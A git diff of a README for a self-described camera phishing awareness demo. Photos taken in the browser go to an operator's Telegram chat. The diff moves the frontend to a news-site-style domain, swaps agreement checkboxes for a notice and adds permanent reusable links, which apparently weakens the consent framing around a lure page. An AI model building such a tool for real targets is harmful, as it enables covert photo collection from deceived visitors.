@@ -4,13 +4,13 @@
 [![Express](https://img.shields.io/badge/Express-4.21.2-000000?logo=express&logoColor=white)](https://expressjs.com/)
 [![SQLite](https://img.shields.io/badge/Database-SQLite%20Persistent-003B57?logo=sqlite&logoColor=white)](https://www.sqlite.org/)
 [![Telegram Bot API](https://img.shields.io/badge/Telegram-Bot%20API%20sendPhoto-26A5E4?logo=telegram&logoColor=white)](https://core.telegram.org/bots/api#sendphoto)
-[![Tests](https://img.shields.io/badge/Tests-34%20Passed-brightgreen)](https://nodejs.org/api/test.html)
+[![Tests](https://img.shields.io/badge/Tests-45%20Passed-brightgreen)](https://nodejs.org/api/test.html)
 
 A professional, consent-based Phishing & Camera Security Awareness Demonstration platform designed to evaluate browser permission models and social engineering recognition across desktop and mobile devices.
 
 The platform provides a modern, video-style landing page with video playback simulation, thumbnails, and advertisement-style content, with zero camera access on initial page load or ordinary video playback. A separate, clearly disclosed **Phishing Awareness Simulation** allows visitors to understand how misleading pages lure users and how browser security protects them:
 - **Safe Simulation Mode**: Uses a prerecorded synthetic test graphic (100% safe, zero camera hardware access).
-- **Live Hardware Gate Mode**: Audits the browser's native permission prompt, captures a single snapshot without live preview, disconnects camera tracks immediately, and delivers to Telegram only with explicit authorization.
+- **Live Hardware Gate Mode**: Requests camera access only after the visitor chooses Continue, lets the visitor capture one photo, and sends it to Telegram only after the separate **Submit Photo** action.
 - **Awareness Debrief**: Explains critical red flags (context mismatch, social engineering lures, native permission gates, hardware LED status) and reviews non-sensitive demonstration telemetry (`page_opened`, `demo_button_clicked`, `simulation_completed`).
 
 > [!IMPORTANT]
@@ -20,8 +20,8 @@ The platform provides a modern, video-style landing page with video playback sim
 
 ## Live Deployments
 
-- **Frontend (GitHub Pages)**: [https://shereef888k.github.io/camera-security-demo/](https://shereef888k.github.io/camera-security-demo/)
-- **Backend API (Render)**: [https://camera-security-demo-1.onrender.com](https://camera-security-demo-1.onrender.com/)
+- **Frontend (Vercel)**: [https://news-kerala-vision-malayalam-fronte-five.vercel.app](https://news-kerala-vision-malayalam-fronte-five.vercel.app)
+- **Backend API (Render)**: [https://news-kerala-vision-malayalam.onrender.com](https://news-kerala-vision-malayalam.onrender.com/)
 
 ---
 
@@ -42,7 +42,7 @@ The platform provides a modern, video-style landing page with video playback sim
 The repository is organized into two decoupled applications:
 
 ```text
-├── frontend/                     # Pure static HTML5/CSS3/Vanilla JS (GitHub Pages ready)
+├── frontend/                     # Static HTML5/CSS3/Vanilla JS (Vercel or GitHub Pages)
 │   ├── index.html                # Video-style landing page (thumbnail, video player, ad content)
 │   ├── demo.html                 # Separate educational camera awareness test (no live preview)
 │   ├── admin.html                # Administrator console & session manager
@@ -109,8 +109,9 @@ The repository is organized into two decoupled applications:
    ADMIN_API_KEY=my_secure_admin_password_12345
    TELEGRAM_BOT_TOKEN=7123456789:AAFlxyz-ExampleBotToken
    TELEGRAM_CHAT_ID=987654321
-   FRONTEND_ORIGIN=*
+   FRONTEND_ORIGIN=http://localhost:3000,http://localhost:5500
    DATABASE_PATH=data/sessions.db
+   DEMO_SESSION_DURATION_MINUTES=30
    ```
    *(See [docs/TELEGRAM_BOT_SETUP.md](docs/TELEGRAM_BOT_SETUP.md) for how to get your Bot Token and Chat ID in 2 minutes).*
 
@@ -139,11 +140,11 @@ npx -y serve frontend -p 3000
 
 1. Open your browser to the **Admin Dashboard**:
    ```text
-   http://localhost:3000/index.html
+   http://localhost:3000/admin.html
    ```
-2. In **Backend & Credentials**, enter your `ADMIN_API_KEY` (`my_secure_admin_password_12345`) and click **Save Settings**.
-3. Under **Create Demo Link**, enter an optional label (e.g. `iPhone 16 Safari Audit`) and click **Generate Secure Link**.
-4. Copy the generated link or open it directly in a browser window to conduct the demonstration!
+2. In **Backend & Credentials**, enter your `ADMIN_API_KEY` and click **Save Settings**.
+3. In **Permanent Reusable Demo Link**, create or copy the link once. It stays valid until an administrator disables or revokes it.
+4. Each visit receives a separate, time-limited session. Visitors choose Continue, grant native camera permission, choose Capture Photo, then choose Submit Photo before a photo is sent.
 
 ---
 
@@ -162,20 +163,20 @@ sequenceDiagram
     Visitor->>Landing: Visits landing page
     Landing->>Visitor: Plays educational video animation & shows tech content (Zero camera access)
     Visitor->>DemoPage: Navigates to separate Educational Camera Security Test
-    DemoPage->>Visitor: Displays clear disclosure and explicit agreement checkboxes
-    Visitor->>DemoPage: Agrees & clicks "Start Camera Security Test"
+    DemoPage->>Visitor: Displays clear camera and photo submission notice
+    Visitor->>Visitor: Chooses Continue
     DemoPage->>Browser: Requests navigator.mediaDevices.getUserMedia()
     Browser->>Visitor: Displays native browser camera permission dialog
     Visitor->>Browser: Approves camera permission
-    DemoPage->>Browser: Off-screen hardware video stream connects (No live preview displayed!)
-    DemoPage->>Browser: Automatically captures single photo onto off-screen canvas
-    DemoPage->>Browser: IMMEDIATELY stops and releases all camera tracks
+    DemoPage->>Visitor: Offers Capture Photo after permission is granted
+    Visitor->>DemoPage: Captures one photo and chooses Submit Photo
+    DemoPage->>Browser: Stops camera tracks after capture or when the visitor exits
     Browser-->>Visitor: Device camera indicator / green dot turns off
     DemoPage->>Backend: POST /api/sessions/:id/photo (Multipart JPEG)
     Backend->>Telegram: sendPhoto(photoBuffer, caption)
     Telegram-->>Backend: 200 OK (Delivered)
-    Backend-->>DemoPage: 200 OK (Audit receipt)
-    DemoPage->>Visitor: Displays Delivery Confirmation receipt & captured snapshot review
+    Backend-->>DemoPage: 200 OK (Submission confirmed)
+    DemoPage->>Visitor: Redirects after the server confirms submission
 ```
 
 ---
@@ -189,16 +190,7 @@ cd backend
 npm test
 ```
 
-Expected output:
-```text
-✔ Photo Submission & Telegram Integration API (14 tests passed)
-✔ Security & Infrastructure Tests (8 tests passed)
-✔ Sessions API Endpoints (12 tests passed)
-ℹ tests 34
-ℹ suites 3
-ℹ pass 34
-ℹ fail 0
-```
+The current suite covers 45 backend and browser-flow tests, including permanent-link lifecycle, database reopen persistence, preflight handling, and five independent visitor sessions.
 
 ---
 
@@ -207,6 +199,7 @@ Expected output:
 - **[Telegram Bot Setup Guide](docs/TELEGRAM_BOT_SETUP.md)**: How to create a bot with BotFather, start the conversation, and find your Chat ID.
 - **[GitHub Pages Deployment Guide](docs/GITHUB_PAGES_DEPLOYMENT.md)**: How to publish the frontend to GitHub Pages with automatic subpath handling.
 - **[Backend Production Deployment Guide](docs/BACKEND_DEPLOYMENT.md)**: Deploying to Render, Railway, or Linux VPS with persistent volumes and CORS.
+- **[Vercel Deployment Guide](docs/VERCEL_DEPLOYMENT.md)**: Configure the static frontend project and API URL.
 - **[REST API Documentation](docs/API_DOCUMENTATION.md)**: Detailed endpoint schemas, request parameters, responses, and error codes.
 - **[Security Checklist](docs/SECURITY_CHECKLIST.md)**: Review of security measures, consent architecture, and secrets isolation.
 - **[Troubleshooting Guide](docs/TROUBLESHOOTING.md)**: Fix camera permission prompts on iOS/Android and solve Telegram error codes.
